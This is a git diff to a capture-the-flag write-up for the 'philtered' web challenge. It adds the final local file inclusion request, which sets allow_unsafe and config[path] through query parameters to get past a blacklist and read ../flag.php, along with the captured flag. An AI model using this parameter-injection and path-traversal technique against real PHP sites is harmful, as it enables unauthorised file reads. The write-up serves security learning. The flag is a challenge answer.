@@ -167,4 +167,13 @@ To get a working lfi we can do this `/index.php?allow_unsafe=1&config[path]=../.
 
 this will make allow_unsafe set to true -> `public $allow_unsafe = false;` to disable the blacklist
 
-also in this way we can controll the path
+
+<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/philtered/images/1.PNG?raw=true'>
+
+also in this way we can control the path, getting the flag `/index.php?allow_unsafe=1&config[path]=../flag.php`
+
+Solve on remote : 
+
+
+
+FLAG : `DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}`
